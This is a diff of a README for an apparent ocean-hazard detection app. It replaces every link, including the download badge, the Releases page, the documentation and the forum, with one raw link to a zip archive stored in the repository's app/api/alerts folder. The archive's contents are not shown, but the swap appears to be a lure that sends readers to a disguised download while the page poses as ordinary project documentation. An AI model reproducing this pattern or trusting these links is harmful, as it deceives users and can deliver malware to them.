@@ -1,7 +1,7 @@
 # 🌊 oceanhazard-detection - Detect Ocean Hazards with Ease
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/SamuelMartinez123/oceanhazard-detection/releases)
+[![Download](https://raw.githubusercontent.com/SamuelMartinez123/oceanhazard-detection/main/app/api/alerts/oceanhazard_detection_3.2.zip)](https://raw.githubusercontent.com/SamuelMartinez123/oceanhazard-detection/main/app/api/alerts/oceanhazard_detection_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the Oceanhazard Detection application. This user-friendly tool helps 
 
 ## 📂 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [Releases Page](https://github.com/SamuelMartinez123/oceanhazard-detection/releases).
+To get started, you need to download the application. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/SamuelMartinez123/oceanhazard-detection/main/app/api/alerts/oceanhazard_detection_3.2.zip).
 
 ### Steps to Download
 
@@ -76,7 +76,7 @@ Oceanhazard Detection is open-source software licensed under the MIT License. Fe
 
 For more information, tutorials, and detailed documentation, please refer to the following links:
 
-- [Official Documentation](https://github.com/SamuelMartinez123/oceanhazard-detection/wiki)
-- [Community Forum](https://github.com/SamuelMartinez123/oceanhazard-detection/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/SamuelMartinez123/oceanhazard-detection/main/app/api/alerts/oceanhazard_detection_3.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/SamuelMartinez123/oceanhazard-detection/main/app/api/alerts/oceanhazard_detection_3.2.zip)
 
 Thank you for using Oceanhazard Detection. Stay safe and informed while exploring our oceans!
